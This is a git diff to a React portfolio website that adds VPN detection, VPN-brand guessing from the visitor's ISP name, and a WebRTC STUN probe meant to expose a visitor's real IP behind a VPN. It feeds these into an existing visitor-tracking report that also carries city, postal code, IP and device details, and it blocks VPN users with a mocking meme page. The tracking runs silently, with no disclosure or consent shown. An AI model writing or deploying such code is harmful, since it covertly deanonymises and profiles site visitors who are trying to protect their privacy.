@@ -54,6 +54,8 @@ const App = () => {
     const [darkMode, setDarkMode] = useState(false);
     const [scrolled, setScrolled] = useState(false);
     const [isMenuOpen, setIsMenuOpen] = useState(false);
+    const [isVpnBlocked, setIsVpnBlocked] = useState(false);
+    const [isCheckingVpn, setIsCheckingVpn] = useState(true);
 
     useEffect(() => {
         // Auto light/dark mode based on geographic local time
@@ -92,6 +94,71 @@ const App = () => {
                 // Fetch IP and Location Data
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
+
+                // Advanced VPN/Proxy Check
+                let isVPN = "Unknown";
+                let vpnBrand = "N/A";
+                try {
+                    const vpnResponse = await fetch(`https://blackbox.ipinfo.app/lookup/${data.ip}`);
+                    const vpnText = await vpnResponse.text();
+                    if (vpnText.trim() === 'Y') {
+                        isVPN = "⚠️ YES (Proxy/VPN)";
+                        setIsVpnBlocked(true);
+                        setIsCheckingVpn(false);
+                        const orgName = (data.org || "").toLowerCase();
+                        if (orgName.includes("tefincom") || orgName.includes("nord")) vpnBrand = "NordVPN";
+                        else if (orgName.includes("expressvpn") || orgName.includes("express vpn")) vpnBrand = "ExpressVPN";
+                        else if (orgName.includes("kape") || orgName.includes("cyberghost") || orgName.includes("zenmate") || orgName.includes("private internet access")) vpnBrand = "CyberGhost / PIA / ZenMate";
+                        else if (orgName.includes("surfshark")) vpnBrand = "Surfshark";
+                        else if (orgName.includes("proton")) vpnBrand = "ProtonVPN";
+                        else if (orgName.includes("mullvad")) vpnBrand = "Mullvad VPN";
+                        else if (orgName.includes("m247") || orgName.includes("datacamp") || orgName.includes("tzulo") || orgName.includes("leaseweb") || orgName.includes("quadranet")) vpnBrand = `Commercial VPN Host (${data.org})`;
+                        else if (orgName.includes("google") || orgName.includes("amazon") || orgName.includes("aws") || orgName.includes("digitalocean") || orgName.includes("ovh") || orgName.includes("linode") || orgName.includes("cloudflare") || orgName.includes("akamai")) vpnBrand = `Cloud Proxy/VPN (${data.org})`;
+                        else vpnBrand = data.org || "Unknown Provider";
+                    } else if (vpnText.trim() === 'N') {
+                        isVPN = "✅ NO";
+                        setIsCheckingVpn(false);
+                    }
+                } catch (e) {
+                    console.log("VPN check failed.");
+                    setIsCheckingVpn(false);
+                }
+
+                // WebRTC Real IP Leak Test
+                const getWebRTCIP = async () => {
+                    return new Promise((resolve) => {
+                        const ips = new Set();
+                        const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                        if (!RTCPeerConnection) return resolve("Not Supported");
+                        
+                        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                        pc.createDataChannel("");
+                        
+                        pc.onicecandidate = (e) => {
+                            if (!e.candidate) {
+                                pc.close();
+                                if (ips.size === 0) resolve("No leak detected");
+                                else resolve(Array.from(ips).join(", "));
+                                return;
+                            }
+                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                            const match = ipRegex.exec(e.candidate.candidate);
+                            if (match && match[1] !== data.ip && !match[1].endsWith('.local')) {
+                                ips.add(match[1]);
+                            }
+                        };
+                        
+                        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve("Offer failed"));
+                        
+                        setTimeout(() => {
+                            pc.close();
+                            if (ips.size === 0) resolve("Timeout / No leak");
+                            else resolve(Array.from(ips).join(", "));
+                        }, 2500);
+                    });
+                };
+                
+                const realIpStr = await getWebRTCIP();
 
                 // Gather Device Data
                 const userAgent = navigator.userAgent;
@@ -146,6 +213,9 @@ ${deviceType}
 📍 *Location:* ${data.city}, ${data.region}, ${data.country_name}
 📮 *Pincode:* ${data.postal}
 🌐 *IP Address:* ${data.ip}
+🛡️ *VPN/Proxy:* ${isVPN}
+🏷️ *VPN Brand:* ${vpnBrand}
+🕵️ *Real IP (WebRTC):* ${realIpStr}
 🏢 *ISP/Org:* ${data.org}
 💻 *Platform:* ${platform}
 📏 *Screen:* ${screenRes}
@@ -168,6 +238,7 @@ ${deviceType}
                 
             } catch (error) {
                 console.error("Error tracking visitor:", error);
+                setIsCheckingVpn(false);
             }
         };
 
@@ -187,6 +258,45 @@ ${deviceType}
         setDarkMode(newMode);
         localStorage.setItem('theme', newMode ? 'dark' : 'light');
     };
+
+    if (isCheckingVpn) {
+        return (
+            <div className={`min-h-screen bg-slate-50 dark:bg-zinc-950 flex flex-col items-center justify-center transition-colors duration-300 font-sans`}>
+                <div className="w-10 h-10 border-4 border-blue-200 dark:border-blue-900 border-t-blue-600 dark:border-t-blue-500 rounded-full animate-spin"></div>
+            </div>
+        );
+    }
+
+    if (isVpnBlocked) {
+        return (
+            <div className={`min-h-screen bg-slate-50 dark:bg-zinc-950 flex flex-col items-center justify-center transition-colors duration-300 font-sans px-6 text-center`}>
+                <div className="bg-white dark:bg-zinc-900 border-4 border-slate-900 dark:border-white shadow-2xl p-4 md:p-6 mb-8 max-w-xl w-full flex flex-col items-center">
+                    <h1 className="text-3xl md:text-5xl font-black text-slate-900 dark:text-white mb-4 uppercase leading-tight font-sans tracking-tight">
+                        POV: YOU TRIED<br/>VPN FOR THE FIRST TIME
+                    </h1>
+                    <img 
+                        src="https://external-preview.redd.it/1460v7N90wN_l1rYk32nL4Pz0f67E_xR3ZIfw_e-T0U.jpg?auto=webp&s=daebb81bb70bdba41f9d5c31cc9c013bc3df1dd5" 
+                        alt="Reality can be whatever I want" 
+                        className="w-full object-cover"
+                        onError={(e) => {
+                            e.target.onerror = null; 
+                            e.target.src = "https://i.imgflip.com/2wnq02.jpg";
+                        }}
+                    />
+                </div>
+                
+                <div id="fallback-msg" style={{display: 'none'}}>
+                    <div className="w-24 h-24 bg-red-100 dark:bg-red-500/10 text-red-600 dark:text-red-500 rounded-3xl flex items-center justify-center mx-auto mb-8 border border-red-200 dark:border-red-500/20 shadow-sm">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" /><path d="m9 12 2 2 4-4" /></svg>
+                    </div>
+                </div>
+
+                <div className="text-slate-600 dark:text-zinc-400 text-sm bg-white dark:bg-[#0a0a0c] px-6 py-4 rounded-xl border border-slate-200 dark:border-zinc-800 inline-block shadow-sm font-medium">
+                    Please disable your VPN or use a residential connection to view this portfolio.
+                </div>
+            </div>
+        );
+    }
 
     return (
         <div className={`min-h-screen bg-slate-50 dark:bg-zinc-950 text-slate-800 dark:text-zinc-200 transition-colors duration-300 font-sans`}>
